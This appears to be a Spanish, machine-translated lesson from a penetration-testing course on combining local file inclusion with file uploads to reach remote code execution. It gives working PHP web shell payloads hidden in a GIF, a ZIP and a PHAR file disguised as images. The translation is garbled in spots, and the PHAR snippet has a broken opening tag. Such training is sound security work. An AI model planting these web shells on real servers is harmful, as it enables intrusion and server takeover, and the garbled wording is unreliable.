# LFI and File Uploads

Las funcionalidades de carga de archivos son ubicuas en la mayoría de las aplicaciones web modernas, ya que los usuarios generalmente necesitan configurar su perfil y uso de la aplicación web cargando sus datos. Para los atacantes, la capacidad de almacenar archivos en el servidor de back-end puede extender la explotación de muchas vulnerabilidades, como una vulnerabilidad de inclusión de archivos.

El[Ataques de carga de archivos](https://academy.hackthebox.com/module/details/136)El módulo cubre diferentes técnicas sobre cómo explotar los formularios y funcionalidades de carga de archivos. Sin embargo, para el ataque que vamos a discutir en esta sección, no requerimos que el formulario de carga de archivos sea vulnerable, sino que simplemente nos permite cargar archivos. Si la función vulnerable tiene código`Execute`Capacidades, entonces el código dentro del archivo que cargamos se ejecutará si lo incluimos, independientemente de la extensión del archivo o el tipo de archivo. Por ejemplo, podemos cargar un archivo de imagen (por ejemplo,`image.jpg`), y almacene un código de shell web PHP dentro de él 'en lugar de datos de imagen', y si lo incluimos a través de la vulnerabilidad de LFI, el código PHP se ejecutará y tendremos una ejecución de código remoto.

Como se menciona en la primera sección, las siguientes son las funciones que permiten ejecutar código con inclusión de archivos, cualquiera de las cuales funcionaría con los ataques de esta sección:

| **Función** | **Leer contenido** | **Ejecutar** | **URL remota** |
| --- | --- | --- | --- |
| **Php** |  |  |  |
| `include()`/`include_once()` | ✅ | ✅ | ✅ |
| `require()`/`require_once()` | ✅ | ✅ | ❌ |
| **Nodejs** |  |  |  |
| `res.render()` | ✅ | ✅ | ❌ |
| **Java** |  |  |  |
| `import` | ✅ | ✅ | ✅ |
| **.NETO** |  |  |  |
| `include` | ✅ | ✅ | ✅ |

---

# **Carga de imágenes**

La carga de imágenes es muy común en la mayoría de las aplicaciones web modernas, ya que la carga de imágenes se considera ampliamente como segura si la función de carga está codificada de forma segura. Sin embargo, como se discutió anteriormente, la vulnerabilidad, en este caso, no está en el formulario de carga de archivo sino en la funcionalidad de inclusión de archivos.

### **Crafting Malicioso Imagen**

Nuestro primer paso es crear una imagen maliciosa que contenga un código de shell web PHP que todavía se ve y funcione como una imagen. Entonces, usaremos una extensión de imagen permitida en nuestro nombre de archivo (por ejemplo,`shell.gif`), y también debe incluir los bytes mágicos de imagen al comienzo del contenido del archivo (por ejemplo,`GIF8`), solo en caso de que el formulario de carga se verifique tanto para el tipo de extensión como de contenido. Podemos hacerlo de la siguiente manera:

LFI y cargas de archivo

```
xnoxos@htb[/htb]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

Este archivo por sí solo es completamente inofensivo y no afectaría las aplicaciones web normales en lo más mínimo. Sin embargo, si lo combinamos con una vulnerabilidad de LFI, entonces podemos alcanzar la ejecución de código remoto.

**Nota:**Estamos usando un`GIF`Imagen en este caso, ya que sus bytes mágicos se escriben fácilmente, ya que son caracteres ASCII, mientras que otras extensiones tienen bytes mágicos en binario que necesitaríamos codificar. Sin embargo, este ataque funcionaría con cualquier imagen o tipo de archivo permitido. El[Ataques de carga de archivos](https://academy.hackthebox.com/module/details/136)El módulo se profundiza más para los ataques de tipo de archivo, y la misma lógica se puede aplicar aquí.

Ahora, necesitamos cargar nuestro archivo de imagen maliciosa. Para hacerlo, podemos ir al`Profile Settings`Página y haga clic en la imagen Avatar para seleccionar nuestra imagen, y luego haga clic en Cargar y nuestra imagen debe cargarse con éxito:

![](https://academy.hackthebox.com/storage/modules/23/lfi_upload_gif.jpg)

### **Ruta de archivo cargada**

Una vez que hemos cargado nuestro archivo, todo lo que necesitamos hacer es incluirlo a través de la vulnerabilidad de LFI. Para incluir el archivo cargado, necesitamos conocer la ruta a nuestro archivo cargado. En la mayoría de los casos, especialmente con las imágenes, tendríamos acceso a nuestro archivo cargado y podemos obtener su ruta de su URL. En nuestro caso, si inspeccionamos el código fuente después de cargar la imagen, podemos obtener su URL:

Código:html

```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

**Nota:**Como podemos ver, podemos usar `/perfil_images/shell.gif` para la ruta del archivo. Si no sabemos dónde se carga el archivo, entonces podemos luchar para un directorio de carga y luego Fuzz para nuestro archivo cargado, aunque esto no siempre funciona, ya que algunas aplicaciones web ocultan correctamente los archivos cargados.

Con la ruta de archivo cargada en cuestión, todo lo que necesitamos hacer es incluir el archivo cargado en la función vulnerable LFI, y el código PHP debe ejecutarse, de la siguiente manera:

![](https://academy.hackthebox.com/storage/modules/23/lfi_include_uploaded_gif.jpg)

Como podemos ver, incluimos nuestro archivo y ejecutamos con éxito el`id`dominio.

**Nota:**Para incluir a nuestro archivo cargado, utilizamos`./profile_images/`Como en este caso, la vulnerabilidad de LFI no prefijo ningún director de director antes de nuestra entrada. En caso de que prefijara un directorio antes de nuestra entrada, simplemente necesitamos`../`Fuera de ese directorio y luego use nuestra ruta de URL, como aprendimos en secciones anteriores.

---

# **ZIP SUPPACIÓN**

Como se mencionó anteriormente, la técnica anterior es muy confiable y debería funcionar en la mayoría de los casos y con la mayoría de los marcos web, siempre que la función vulnerable permita la ejecución del código. Hay un par de otras técnicas solo PHP que utilizan envoltorios PHP para lograr el mismo objetivo. Estas técnicas pueden ser útiles en algunos casos específicos en los que la técnica anterior no funciona.

Podemos utilizar el[cremallera](https://www.php.net/manual/en/wrappers.compression.php)Envoltura para ejecutar el código PHP. Sin embargo, este envoltorio no está habilitado de forma predeterminada, por lo que este método puede no siempre funcionar. Para hacerlo, podemos comenzar creando un script de shell de web php y encerrarlo en un archivo zip (llamado`shell.jpg`), como sigue:

LFI y cargas de archivo

```
xnoxos@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

**Nota:**A pesar de que nombramos nuestro archivo zip como (shell.jpg), algunos formularios de carga aún pueden detectar nuestro archivo como un archivo ZIP a través de pruebas de tipo de contenido y no permitir su carga, por lo que este ataque tiene una mayor probabilidad de trabajar si se permite la carga de archivos zip.

Una vez que subimos el`shell.jpg`Archivo, podemos incluirlo con el`zip`envoltura como (`zip://shell.jpg`), y luego consulte cualquier archivo dentro de él con`#shell.php`(URL codificada). Finalmente, podemos ejecutar comandos como siempre lo hacemos con`&cmd=id`, como sigue:

![](https://academy.hackthebox.com/storage/modules/23/data_wrapper_id.png)

Como podemos ver, este método también funciona en la ejecución de comandos a través de scripts PHP con cremallera.

**Nota:**Agregamos el directorio de carga (`./profile_images/`) antes del nombre del archivo, como la página vulnerable (`index.php`) está en el directorio principal.

---

# **PHAR SUBPACIÓN**

Finalmente, podemos usar el`phar://`envoltura para lograr un resultado similar. Para hacerlo, primero escribiremos el siguiente script PHP en un`shell.php`archivo:

Código:php

```php
<?php$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();

```

Este script se puede compilar en un`phar`Archivo que cuando se llame escribiría un shell web a un`shell.txt`subcilio, con el que podemos interactuar. Podemos compilarlo en un`phar`Archivo y renombrarlo a`shell.jpg`como sigue:

LFI y cargas de archivo

```
xnoxos@htb[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Ahora, deberíamos tener un archivo PHAR llamado`shell.jpg`. Una vez que la subimos a la aplicación web, simplemente podemos llamarlo con`phar://`y proporcionar su ruta de URL y luego especifique el subcresión PHAR con`/shell.txt`(URL codificada) Para obtener la salida del comando que especificamos (`&cmd=id`), como sigue:

![](https://academy.hackthebox.com/storage/modules/23/rfi_localhost.jpg)

Como podemos ver, el`id`El comando fue ejecutado con éxito. Ambos`zip`y`phar`Los métodos de envoltura deben considerarse como métodos alternativos en caso de que el primer método no funcionara, ya que el primer método que discutimos es el más confiable entre los tres.

**Nota:**Vale la pena señalar otro ataque (obsoleto) LFI/Subloads, que ocurre si las cargas de archivo están habilitados en las configuraciones de PHP y las`phpinfo()`La página está de alguna manera expuesta a nosotros. Sin embargo, este ataque no es muy común, ya que tiene requisitos muy específicos para que funcione (LFI + Subida habilitado + Phpinfo () expuesto ()). Si está interesado en saber más al respecto, puede consultar[Este enlace](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo).